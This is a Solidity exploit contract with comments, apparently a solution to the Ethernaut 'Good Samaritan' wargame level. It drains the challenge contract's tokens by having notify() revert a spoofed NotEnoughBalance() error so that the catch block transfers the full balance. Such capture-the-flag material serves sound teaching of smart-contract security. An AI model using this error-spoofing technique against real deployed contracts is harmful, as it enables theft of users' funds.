//  the goal of this level is to drain all the tokens from this contract

// steps
// We made a call to requestDonation() and the execution flow goes to wallet.donate10(msg.sender).
// The wallet contract calls coin.transfer() if everything goes well.
// The coin.transfer() function does the necessary calculations, checks if our address is a contract, and then calls a notify() function on our address.
// This is where we attack. We create a notify() function in our contract and make it revert a custom error with the name NotEnoughBalance(). This will trigger the error in the GoodSamaritan.requestDonation() function and the catch() block will be triggered transferring us all the tokens.
// But wait, there's another catch. Transferring all the tokens won't work because our contract will just revert the transaction. To counter this, we will need to add another condition to our notify() function to check if the amount <= 10, and then only revert.


// Read more >>> https://blog.dixitaditya.com/ethernaut-level-27-good-samaritan
//SPDX-License-Identifier:MIT
pragma solidity ^0.8;

interface IGood {
    function coin() external view returns (address);
    function requestDonation() external returns (bool enoughBalance);
}

interface ICoin {
    function balances(address) external view returns (uint256);
}

contract Hack {
    IGood private immutable target;
    ICoin private immutable coin;

    error NotEnoughBalance();

    constructor(IGood _target) {
        target = _target;
        coin = ICoin(_target.coin());
    }

    function pwn() external {
        target.requestDonation();
        require(coin.balances(address(this)) == 10 ** 6, "hack failed");
    }

    function notify(uint256 amount) external {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}